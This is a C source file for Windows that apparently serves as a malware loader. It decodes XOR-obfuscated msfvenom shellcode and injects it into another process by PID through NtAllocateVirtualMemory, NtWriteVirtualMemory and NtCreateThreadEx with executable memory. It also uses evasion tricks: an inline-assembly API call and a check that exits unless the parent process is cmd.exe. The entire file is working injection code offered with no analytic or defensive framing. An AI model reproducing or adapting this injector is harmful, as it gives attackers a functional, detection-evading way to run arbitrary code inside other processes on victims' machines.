#include <stdio.h>
#include <time.h>
#include <Windows.h>
#include <tlhelp32.h>

#define GETPPID 0
#define GETNAME 1
#define GETPNAME 2

typedef union _PEDATA {
	int pid;
	char name[32];
} PEDATA;

typedef struct _UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} UNICODE_STRING, *PUNICODE_STRING;

typedef struct _OBJECT_ATTRIBUTES {
    ULONG           Length;
    HANDLE          RootDirectory;
    PUNICODE_STRING ObjectName;
    ULONG           Attributes;
    PVOID           SecurityDescriptor;
    PVOID           SecurityQualityOfService;
} OBJECT_ATTRIBUTES, *POBJECT_ATTRIBUTES;

typedef struct _PS_ATTRIBUTE {
    ULONG Attribute;
    SIZE_T Size;
    union {
        ULONG Value;
        PVOID ValuePtr;
    } u1;
    PSIZE_T ReturnLength;
} PS_ATTRIBUTE, *PPS_ATTRIBUTE;

typedef struct _PS_ATTRIBUTE_LIST
{
    SIZE_T       TotalLength;
    PS_ATTRIBUTE Attributes[1];
} PS_ATTRIBUTE_LIST, *PPS_ATTRIBUTE_LIST;

typedef NTSTATUS(NTAPI* NAVM)(HANDLE, PVOID, ULONG, PULONG, ULONG, ULONG);
typedef NTSTATUS(NTAPI* NWVM)(HANDLE, PVOID, PVOID, ULONG, PULONG);
typedef NTSTATUS(NTAPI* NCT)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, HANDLE, PVOID, PVOID, ULONG, SIZE_T, SIZE_T, SIZE_T, PPS_ATTRIBUTE_LIST);

unsigned char * decrypt(unsigned char *, int, int);
PEDATA fetchdata(int, int);
HANDLE takeSnapshot(void);

unsigned char * decrypt(unsigned char * data, int dataLen, int xor_key) 
{
	unsigned char * output = (unsigned char *)malloc(sizeof(unsigned char) * dataLen+1);

	for (int i = 0; i < dataLen; i++)
		output[i] = data[i] ^ xor_key;

	return output;
}

HANDLE takeSnapshot(void)
{
	HANDLE hSnapshot;
	HMODULE hModule = LoadLibraryA("Kernel32.dll");
	FARPROC snapAddress = GetProcAddress(hModule, "CreateToolhelp32Snapshot");
	__asm__
	(
		".intel_syntax noprefix;"
		"mov edx, 0;"
		"mov ecx, 2;"
		"call %1;"
		"mov %0, rax;"
		".att_syntax;"
		: "=&r" ( hSnapshot )
		: "r" ( snapAddress )
		: "edx", "ecx"
	);
	return hSnapshot;
}

PEDATA fetchdata(int pid, int mode)
{
	if (mode == 2)
		return fetchdata((fetchdata(pid, GETPPID)).pid, GETNAME);
	PEDATA data;
	PROCESSENTRY32 pe;
	HANDLE hSnapshot = takeSnapshot();
	pe.dwSize = sizeof(PROCESSENTRY32);
	while (Process32Next(hSnapshot, &pe))
		if (pe.th32ProcessID == pid)
			break;
	CloseHandle(hSnapshot);
	if (mode == 0)
		data.pid = pe.th32ParentProcessID;
	if (mode == 1)
		strncpy(data.name, pe.szExeFile, 31);
	return data;
}

int main(int argc, char * argv[])
{

	unsigned char * ntdll = "ntdll.dll";
	unsigned char * navm = "NtAllocateVirtualMemory";
	unsigned char * nwvm = "NtWriteVirtualMemory";
	unsigned char * ncte = "NtCreateThreadEx";
	
	char pname[32];
	strncpy(pname, fetchdata(GetCurrentProcessId(), GETPNAME).name, 31);
	if (strncmp(pname, "cmd.exe", 7))
		exit(0);
	
  // { msfvenom -p windows/x64/exec CMD=cmd.exe EXITFUNC=thread -f c } payload encryped with XOR key 0x53
unsigned char encoded[] = 
"\xaf\x1b\xd0\xb7\xa3\xbb\x93\x53\x53\x53\x12\x02\x12\x03\x01\x02\x05\x1b\x62\x81\x36\x1b"
"\xd8\x01\x33\x1b\xd8\x01\x4b\x1b\xd8\x01\x73\x1b\xd8\x21\x03\x1b\x5c\xe4\x19\x19\x1e\x62"
"\x9a\x1b\x62\x93\xff\x6f\x32\x2f\x51\x7f\x73\x12\x92\x9a\x5e\x12\x52\x92\xb1\xbe\x01\x12"
"\x02\x1b\xd8\x01\x73\xd8\x11\x6f\x1b\x52\x83\xd8\xd3\xdb\x53\x53\x53\x1b\xd6\x93\x27\x34"
"\x1b\x52\x83\x03\xd8\x1b\x4b\x17\xd8\x13\x73\x1a\x52\x83\xb0\x05\x1b\xac\x9a\x12\xd8\x67"
"\xdb\x1b\x52\x85\x1e\x62\x9a\x1b\x62\x93\xff\x12\x92\x9a\x5e\x12\x52\x92\x6b\xb3\x26\xa2"
"\x1f\x50\x1f\x77\x5b\x16\x6a\x82\x26\x8b\x0b\x17\xd8\x13\x77\x1a\x52\x83\x35\x12\xd8\x5f"
"\x1b\x17\xd8\x13\x4f\x1a\x52\x83\x12\xd8\x57\xdb\x1b\x52\x83\x12\x0b\x12\x0b\x0d\x0a\x09"
"\x12\x0b\x12\x0a\x12\x09\x1b\xd0\xbf\x73\x12\x01\xac\xb3\x0b\x12\x0a\x09\x1b\xd8\x41\xba"
"\x04\xac\xac\xac\x0e\x1b\xe9\x52\x53\x53\x53\x53\x53\x53\x53\x1b\xde\xde\x52\x52\x53\x53"
"\x12\xe9\x62\xd8\x3c\xd4\xac\x86\xe8\xb3\x4e\x79\x59\x12\xe9\xf5\xc6\xee\xce\xac\x86\x1b"
"\xd0\x97\x7b\x6f\x55\x2f\x59\xd3\xa8\xb3\x26\x56\xe8\x14\x40\x21\x3c\x39\x53\x0a\x12\xda"
"\x89\xac\x86\x30\x3e\x37\x7d\x36\x2b\x36\x53";

	const unsigned int XOR_KEY = 0x53;
	size_t sc_len = sizeof(encoded)-1; //auto type char array will +1 by default
	unsigned char * shellcode = decrypt(encoded, sc_len, XOR_KEY);
	int newPid = atoi(argv[1]);

    HANDLE pHandle = OpenProcess(PROCESS_ALL_ACCESS, 0, (DWORD)newPid);
    HANDLE tHandle;
    HINSTANCE hNtdll = LoadLibraryA(ntdll);

    NAVM NtAllocateVirtualMemory = (NAVM)GetProcAddress(hNtdll, navm);
    NWVM NtWriteVirtualMemory = (NWVM)GetProcAddress(hNtdll, nwvm);
    NCT NtCreateThreadEx = (NCT)GetProcAddress(hNtdll, ncte);
    void * allocAddr = NULL;
    SIZE_T allocSize = sc_len;
    NTSTATUS status;
    status = NtAllocateVirtualMemory(pHandle, &allocAddr, 0, (PULONG)&allocSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    status = NtWriteVirtualMemory(pHandle, allocAddr, shellcode, sc_len, NULL);
    status = NtCreateThreadEx(&tHandle, GENERIC_EXECUTE, NULL, pHandle, allocAddr, NULL, 0, 0, 0, 0, NULL);

    CloseHandle(pHandle);
    CloseHandle(tHandle);
    return 0;
}